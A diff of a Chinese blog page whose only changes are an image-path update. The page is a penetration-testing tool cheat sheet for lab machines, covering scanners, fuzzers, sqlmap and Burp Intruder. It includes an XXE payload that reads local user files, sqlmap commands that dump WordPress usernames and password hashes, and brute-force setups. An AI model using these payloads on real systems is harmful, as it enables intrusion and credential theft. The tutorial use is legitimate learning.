@@ -122,7 +122,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"genioco.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"839133d5bbdb7688edec52dfcde2a75b","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"genioco.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":80,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/common/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"839133d5bbdb7688edec52dfcde2a75b","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -399,13 +399,13 @@
 <p>eg:</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 使用/usr/share/wordlists/dirb/big.txt 字典来扫描Web服务</span><br>dirb http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">56.118</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/big.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/11/Qb9qmFXSolACwkY.png" srcset="/img/loading.gif" lazyload alt="image-20220108130748111"></p>
+<p><img src="https://s2.loli.net/2022/01/11/Qb9qmFXSolACwkY.png" srcset="/img/common/loading.gif" lazyload alt="image-20220108130748111"></p>
 <figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 设置UA和cookie</span><br>dirb <span class="hljs-keyword">http</span>://<span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.118</span> -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0&quot;</span> -c <span class="hljs-string">&quot;BAIDUID=D5C6351DAC89EF8811A51DF3A9A9C0C4:FG=1; HMACCOUNT=2906306413846532; BIDUPSID=D5C6351DAC89EF8811A51DF3A9A9C0C4; PSTM=1585744543; BDORZ=FFFB88E999055A3F8A630C64834BD6D0; H_PS_PSSID=30974_1438_31124_21098; HMVT=6bcd52f51e9b3dce32bec4a3997715ac|1587436663|; delPer=0; PSINO=6; BDRCVFR[gltLrB7qNCt]=mk3SLVN4HKm&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/11/EPZACtFYoLxBfbz.png" srcset="/img/loading.gif" lazyload alt="image-20220108131009205"></p>
+<p><img src="https://s2.loli.net/2022/01/11/EPZACtFYoLxBfbz.png" srcset="/img/common/loading.gif" lazyload alt="image-20220108131009205"></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 对每个字典添加.dist后缀并延迟100ms,输出保存至test.txt</span><br><span class="hljs-attribute">dirb</span> http://<span class="hljs-number">192.168.56.118</span>  -X .dist -z <span class="hljs-number">100</span> -o test.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/11/3io2NwByrspKOXz.png" srcset="/img/loading.gif" lazyload alt="image-20220108131242372"></p>
+<p><img src="https://s2.loli.net/2022/01/11/3io2NwByrspKOXz.png" srcset="/img/common/loading.gif" lazyload alt="image-20220108131242372"></p>
 <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 使用代理</span><br><span class="hljs-attribute">dirb</span> http://192.168.1.116  -p IP:port<br></code></pre></td></tr></table></figure>
 
 <p><strong>参考链接</strong></p>
@@ -420,7 +420,7 @@
 
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sn -PR -T4 <span class="hljs-number">192.168.56.0</span>/<span class="hljs-number">24</span> <br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/11/sMJ9w3BIWpH74b2.png" srcset="/img/loading.gif" lazyload alt="image-20220109133211323"></p>
+<p><img src="https://s2.loli.net/2022/01/11/sMJ9w3BIWpH74b2.png" srcset="/img/common/loading.gif" lazyload alt="image-20220109133211323"></p>
 <p><strong>参考链接</strong></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35258210/article/details/113564756">nmap常用参数使用</a></p>
 <h3 id="4、masscan"><a href="#4、masscan" class="headerlink" title="4、masscan"></a>4、masscan</h3><p>功能：快速扫描端口，只能扫描端口</p>
@@ -430,7 +430,7 @@
 <p>示例：</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 扫描全部端口</span><br><span class="hljs-attribute">masscan</span> -p <span class="hljs-number">0</span>-<span class="hljs-number">65535</span> <span class="hljs-number">10.35.0.133</span> --rate=<span class="hljs-number">2000</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/1233d2d2afb84ce7b2a33b6e14de9387.png" srcset="/img/loading.gif" lazyload alt="image-20220116122150712"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/1233d2d2afb84ce7b2a33b6e14de9387.png" srcset="/img/common/loading.gif" lazyload alt="image-20220116122150712"></p>
 <h3 id="5、whatweb"><a href="#5、whatweb" class="headerlink" title="5、whatweb"></a>5、whatweb</h3><p>功能：扫描网站指纹</p>
 <p>用法：</p>
 <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs diff">格式：whatweb [options] &lt;URLs&gt;<br><span class="hljs-deletion">-version 查看whatweb版本</span><br>IP 简要输出<br><span class="hljs-deletion">-v IP 详细输出</span><br><span class="hljs-deletion">-input-file=路径 从外部导入目标数据进行批量探测</span><br><span class="hljs-deletion">-i 路径 从外部导入目标数据进行批量探测</span><br><span class="hljs-deletion">-log-xml=result.xml 根据特定的格式探测的结果导出</span><br><span class="hljs-deletion">-url-prefix 添加前缀</span><br><span class="hljs-deletion">-url-suffix 添加后缀</span><br><span class="hljs-deletion">-url-pattern 在中间插入内容</span><br><span class="hljs-deletion">-proxy-user admin:password url 以指定用户名和密码进行探测</span><br><span class="hljs-deletion">-c=cookie值 url 通过-c,指定cookie的值</span><br><span class="hljs-deletion">-l 列出插件的列表,包括插件以及插件的描述</span><br><span class="hljs-deletion">-info-plugins=&quot;Zoom&quot; 具体查看插件的内容</span><br></code></pre></td></tr></table></figure>
@@ -438,7 +438,7 @@
 <p>eg:</p>
 <figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 查看指定地址详细网站信息</span><br>whatweb <span class="hljs-punctuation">-</span>v http<span class="hljs-punctuation">:</span><span class="hljs-comment">//192.168.56.118</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/11/zCy2PUAhb1XkY4i.png" srcset="/img/loading.gif" lazyload alt="image-20220108131632157"></p>
+<p><img src="https://s2.loli.net/2022/01/11/zCy2PUAhb1XkY4i.png" srcset="/img/common/loading.gif" lazyload alt="image-20220108131632157"></p>
 <h3 id="5、arp-scan"><a href="#5、arp-scan" class="headerlink" title="5、arp-scan"></a>5、arp-scan</h3><p><strong>功能：</strong>ARP扫描</p>
 <h3 id="6、ffuf"><a href="#6、ffuf" class="headerlink" title="6、ffuf"></a>6、ffuf</h3><p><strong>功能：</strong></p>
 <pre><code class="hljs">    • 目录发现，可选择在 URL 中的任何位置进行模糊测试。
@@ -450,11 +450,11 @@
 <p><strong>基础用法：</strong></p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.35</span>.<span class="hljs-number">0.187</span><span class="hljs-regexp">/FUZZ -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/836bfd12664b4e528b18a7e3fa7eeb7a.png" srcset="/img/loading.gif" lazyload alt="image-20220223221522870"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/836bfd12664b4e528b18a7e3fa7eeb7a.png" srcset="/img/common/loading.gif" lazyload alt="image-20220223221522870"></p>
 <p><strong>递归扫描：</strong></p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.35</span>.<span class="hljs-number">0.187</span><span class="hljs-regexp">/FUZZ -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt -recursion <span class="hljs-string">&quot;2&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/a67310b35c5f4394b42363ab0a3859b3.png" srcset="/img/loading.gif" lazyload alt="image-20220225090616678"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/a67310b35c5f4394b42363ab0a3859b3.png" srcset="/img/common/loading.gif" lazyload alt="image-20220225090616678"></p>
 <p><strong>进阶用法：</strong></p>
 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">-maxtime 在有限的时间内完成测试，不论是否完成都将终止，单位为s，<br>尽量使用<span class="hljs-strong">**-maxtime-job与-recursion**</span>递归扫描一起使用，用于指定每个目录递归扫描时间，避免扫描时间过长<br></code></pre></td></tr></table></figure>
 
@@ -465,7 +465,7 @@
 <p>匹配响应状态码为200，301进行输出</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.35</span>.<span class="hljs-number">0.187</span><span class="hljs-regexp">/FUZZ -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt -mc <span class="hljs-number">200</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/b2e02861030c43cfb1cfef5f96a235dd.png" srcset="/img/loading.gif" lazyload alt="image-20220225090823792"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/b2e02861030c43cfb1cfef5f96a235dd.png" srcset="/img/common/loading.gif" lazyload alt="image-20220225090823792"></p>
 <p><strong>过滤输出：</strong></p>
 <p>不输出具有特定特征的状态码状态码、行数、响应大小、字数以及匹配正则表达式的模式的输出</p>
 <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-fc 按状态码过滤</span><br><span class="hljs-deletion">-fl 按行数过滤</span><br><span class="hljs-deletion">-fs 按响应大小过滤</span><br><span class="hljs-deletion">-fw 按字数过滤</span><br><span class="hljs-deletion">-fr 按正则表达式模式过滤</span><br></code></pre></td></tr></table></figure>
@@ -473,7 +473,7 @@
 <p>不输出响应状态码为200</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.35</span>.<span class="hljs-number">0.187</span><span class="hljs-regexp">/FUZZ -w /u</span>sr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>big.txt -fc<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/8c298d48fd7b44a28efb3cd9d2c6ea37.png" srcset="/img/loading.gif" lazyload alt="image-20220225091335288"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/8c298d48fd7b44a28efb3cd9d2c6ea37.png" srcset="/img/common/loading.gif" lazyload alt="image-20220225091335288"></p>
 <p><strong>对多个域名进行目录发现</strong></p>
 <figure class="highlight profile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs profile">ffuf -w dict.txt:FUZZ -w /targets.txt:URL -u URLFUZZ -mc <span class="hljs-number">200</span> -of csv -o resule.txt<br></code></pre></td></tr></table></figure>
 
@@ -491,7 +491,7 @@
 <p><strong>HTTP请求爆破</strong></p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -c -X FUZZ -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>wfuzz<span class="hljs-regexp">/general/</span>http_methods.txt -u <span class="hljs-variable">$url</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/5f0dded9a3cf47f987635b70012e82f1.png" srcset="/img/loading.gif" lazyload alt="image-20220928101832937"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/5f0dded9a3cf47f987635b70012e82f1.png" srcset="/img/common/loading.gif" lazyload alt="image-20220928101832937"></p>
 <h3 id="7、Netdiscover"><a href="#7、Netdiscover" class="headerlink" title="7、Netdiscover"></a>7、Netdiscover</h3><p><strong>功能：</strong>二层发现工具，拥有主动和被动发现两种方式。</p>
 <p><strong>用法：</strong></p>
 <figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs diff">格式:netdiscover [options]<br><span class="hljs-deletion">-p 被动模式。默默的侦听指定的网卡以发现别的二层主机，不发送任何数据</span><br><span class="hljs-deletion">-t ARP包发送间隔。单位毫秒。这个可以用来规避检测系统的告警。</span><br><span class="hljs-deletion">-l file: 指定扫描范围列表文件</span><br><span class="hljs-deletion">-p passive mode: 使用被动扫描的方式，不发送任何数据</span><br><span class="hljs-deletion">-m file: 扫描已知 mac 地址和主机名的电脑列表</span><br><span class="hljs-deletion">-F filter: 指定 pcap 筛选器表达式(默认:“arp”)</span><br><span class="hljs-deletion">-s time: 每个 arp 请求之间的睡眠时间(毫秒)</span><br><span class="hljs-deletion">-n node: 使用八字节的形式扫描(2 - 253)</span><br><span class="hljs-deletion">-c count: 发送 arp 请求的时间次数</span><br><span class="hljs-deletion">-f: 使用主动模式的扫描</span><br><span class="hljs-deletion">-d: 忽略配置文件</span><br><span class="hljs-deletion">-S: 启用每个 arp 请求之间抑制的睡眠时间</span><br><span class="hljs-deletion">-P: 打印结果</span><br><span class="hljs-deletion">-N: 不打印头。只有启用- p时有效。</span><br><span class="hljs-deletion">-L: 将捕获的信息输出(-P)，并继续进行扫描</span><br></code></pre></td></tr></table></figure>
@@ -512,13 +512,13 @@
 <p><strong>任意文件读取</strong></p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -d &#x27;<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///home/david/FUZZ&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span><span class="hljs-symbol">&amp;file;</span>©right;<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span>&#x27; --hh 85 http://10.35.153.34/magic.php<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/09881e4f15d240e1882e14c9abe6dd91.png" srcset="/img/loading.gif" lazyload alt="image-20220628194307797"></p>
+<p><img src="https://img-blog.csdnimg.cn/09881e4f15d240e1882e14c9abe6dd91.png" srcset="/img/common/loading.gif" lazyload alt="image-20220628194307797"></p>
 <p>发现用户目录下的.viminfo(vi程序的信息文件，主要用于记录vi的状态信息)文件，访问看看。</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/a8671955ee1f4ee6ade7689debf6784b.png" srcset="/img/loading.gif" lazyload alt="image-20220628194503752"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/a8671955ee1f4ee6ade7689debf6784b.png" srcset="/img/common/loading.gif" lazyload alt="image-20220628194503752"></p>
 <p><strong>模糊测试请求方法</strong></p>
 <figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">wfuzz -z list,<span class="hljs-string">&quot;<span class="hljs-keyword">PUT</span>-<span class="hljs-keyword">POST</span>-<span class="hljs-keyword">HEAD</span>-<span class="hljs-keyword">OPTIONS</span>-<span class="hljs-keyword">TRACE</span>-<span class="hljs-keyword">GET</span>&quot;</span> -X FUZZ $url<br>或使用seclist的方法字典<br>wfuzz -w /usr/share/seclists/Fuzzing/http-request-methods.txt -X FUZZ $url<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/direct/e1edaa5bcf9b4c7c8316fbb446888f79.png" srcset="/img/loading.gif" lazyload alt="image-20220928100634603"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/e1edaa5bcf9b4c7c8316fbb446888f79.png" srcset="/img/common/loading.gif" lazyload alt="image-20220928100634603"></p>
 <h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h2 id="三、web程序"><a href="#三、web程序" class="headerlink" title="三、web程序"></a>三、web程序</h2><h3 id="1-sqlmap"><a href="#1-sqlmap" class="headerlink" title="1.sqlmap"></a>1.sqlmap</h3><p>功能：</p>
 <p>用法：</p>
 <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ada">格式：<br><span class="hljs-comment">--is-dbs 当前用户权限</span><br><span class="hljs-comment">--dbs 所有数据库</span><br><span class="hljs-comment">--current-db 网站当前数据库</span><br><span class="hljs-comment">--users 所有数据库用户</span><br><span class="hljs-comment">--current-user 当前数据库用户</span><br><span class="hljs-comment">--random-agent 构成随机的user-agent</span><br><span class="hljs-comment">--passwords 数据库密码</span><br><span class="hljs-comment">--proxy 代理</span><br><span class="hljs-comment">--time-sec 响应延迟时间</span><br><span class="hljs-comment">--threads 使用多少线程</span><br><span class="hljs-comment">--batch 自动化选择,不会询问你输入，全部默认确定</span><br></code></pre></td></tr></table></figure>
@@ -528,16 +528,16 @@
 <p>eg:</p>
 <figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 爆数据库名</span><br>sqlmap -u http:<span class="hljs-string">//192.168.200.134/Hackademic_RTB1/</span>?cat=1 <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/11/UVLWMw4CjcXaS8z.png" srcset="/img/loading.gif" lazyload alt="image-20220108164716371"></p>
+<p><img src="https://s2.loli.net/2022/01/11/UVLWMw4CjcXaS8z.png" srcset="/img/common/loading.gif" lazyload alt="image-20220108164716371"></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 爆指定数据库表名</span><br><span class="hljs-attribute">sqlmap</span> <span class="hljs-number">192.168.56.118</span>/Hackademic_RTB1/?cat=<span class="hljs-number">1</span> -D wordpress --tables --batch<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/11/tpkPDyojQdqzhUi.png" srcset="/img/loading.gif" lazyload alt="image-20220108164829768"></p>
+<p><img src="https://s2.loli.net/2022/01/11/tpkPDyojQdqzhUi.png" srcset="/img/common/loading.gif" lazyload alt="image-20220108164829768"></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 爆指定数据表的列名</span><br><span class="hljs-attribute">sqlmap</span> <span class="hljs-number">192.168.56.118</span>/Hackademic_RTB1/?cat=<span class="hljs-number">1</span> -D wordpress -T wp_users --columns --batch<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/11/IevKw6SJXsTg9n3.png" srcset="/img/loading.gif" lazyload alt="image-20220108165228689"></p>
+<p><img src="https://s2.loli.net/2022/01/11/IevKw6SJXsTg9n3.png" srcset="/img/common/loading.gif" lazyload alt="image-20220108165228689"></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 爆指定数据表的内容</span><br><span class="hljs-attribute">sqlmap</span> <span class="hljs-number">192.168.56.118</span>/Hackademic_RTB1/?cat=<span class="hljs-number">1</span> -D wordpress -T wp_users -C user_login,user_pass,user_level --dump  --batch<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/01/11/E5TPmadfwHybBlF.png" srcset="/img/loading.gif" lazyload alt="image-20220108165114358"></p>
+<p><img src="https://s2.loli.net/2022/01/11/E5TPmadfwHybBlF.png" srcset="/img/common/loading.gif" lazyload alt="image-20220108165114358"></p>
 <h3 id="2-wpscan"><a href="#2-wpscan" class="headerlink" title="2.wpscan"></a>2.wpscan</h3><p><strong>简介：</strong></p>
 <p>wpscan专门用来扫描wordpress搭建网站的漏洞</p>
 <p><strong>用法：</strong></p>
@@ -548,24 +548,24 @@
 
 <h3 id="3-burp-suite"><a href="#3-burp-suite" class="headerlink" title="3.burp suite"></a>3.burp suite</h3><p><strong>Intrude模块</strong></p>
 <p>四种模式介绍</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/c01b77137c1c4f378fb4bc699c65ccdc.png" srcset="/img/loading.gif" lazyload alt="image-20220522182121943"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/c01b77137c1c4f378fb4bc699c65ccdc.png" srcset="/img/common/loading.gif" lazyload alt="image-20220522182121943"></p>
 <p><strong>Sniper（狙击手模式）</strong></p>
 <p>狙击手模式使用一组payload集合，它一次只使用一个payload标记位置，假设你标记了两个位置user和password，则狙击手会先保持password位置为原有数据，payload逐个替换user；之后保持user位置为原有数据，payload逐个替换user。总攻击次数为(payload数量xpay标记位置数量)。</p>
 <p>payload:</p>
 <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">admin<br>pikachu<br><span class="hljs-keyword">test</span><br><span class="hljs-keyword"></span>tian<br></code></pre></td></tr></table></figure>
 
 <p>攻击结果：</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/6ccda977d5bb43ba97b85ebe36c4fd82.png" srcset="/img/loading.gif" lazyload alt="image-20220522182600994"></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/14ad4cc7222d468bb66a85529f5bb836.png" srcset="/img/loading.gif" lazyload alt="image-20220522182620759"></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/c8b73f0e6dd44782a1ebe65c21ac0feb.png" srcset="/img/loading.gif" lazyload alt="image-20220522182636912"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/6ccda977d5bb43ba97b85ebe36c4fd82.png" srcset="/img/common/loading.gif" lazyload alt="image-20220522182600994"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/14ad4cc7222d468bb66a85529f5bb836.png" srcset="/img/common/loading.gif" lazyload alt="image-20220522182620759"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/c8b73f0e6dd44782a1ebe65c21ac0feb.png" srcset="/img/common/loading.gif" lazyload alt="image-20220522182636912"></p>
 <p><strong>Battering ram（攻城锤模式）</strong></p>
 <p>攻城锤模式与狙击手模式类似的地方是，同样只使用一个payload集合，不同的地方在于每次攻击都是替换所有payload标记位置，而狙击手模式每次只能替换一个payload标记位置。总攻击次数为(payload数量)。</p>
 <p>payload:</p>
 <figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">admin<br>pikachu<br><span class="hljs-keyword">test</span><br><span class="hljs-keyword"></span>tian<br></code></pre></td></tr></table></figure>
 
 <p>攻击结果：</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/db78de7b66554883866b4eaf6111dc28.png" srcset="/img/loading.gif" lazyload alt="image-20220522182837558"></p>
-<p><img src="https://img-blog.csdnimg.cn/direct/299b4ce570c549b3b4ea8a484474bb96.png" srcset="/img/loading.gif" lazyload alt="image-20220522182852593"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/db78de7b66554883866b4eaf6111dc28.png" srcset="/img/common/loading.gif" lazyload alt="image-20220522182837558"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/299b4ce570c549b3b4ea8a484474bb96.png" srcset="/img/common/loading.gif" lazyload alt="image-20220522182852593"></p>
 <p><strong>Pitchfork（草叉模式）</strong></p>
 <p>草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合。总攻击次数为(payload数量)。</p>
 <p>payload1：</p>
@@ -575,7 +575,7 @@
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">123456<br>000000<br>abc123<br>tian<br></code></pre></td></tr></table></figure>
 
 <p>攻击结果：</p>
-<p><img src="https://img-blog.csdnimg.cn/direct/e72d9be9fa5446869b851456f5883a08.png" srcset="/img/loading.gif" lazyload alt="image-20220522183017937"></p>
+<p><img src="https://img-blog.csdnimg.cn/direct/e72d9be9fa5446869b851456f5883a08.png" srcset="/img/common/loading.gif" lazyload alt="image-20220522183017937"></p>
 <p><strong>Cluster bomb（集束炸弹模式）</strong></p>
 <p>集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积。总攻击次数为(payload1数量xpayload2数量)。</p>
 <p>payload1：</p>
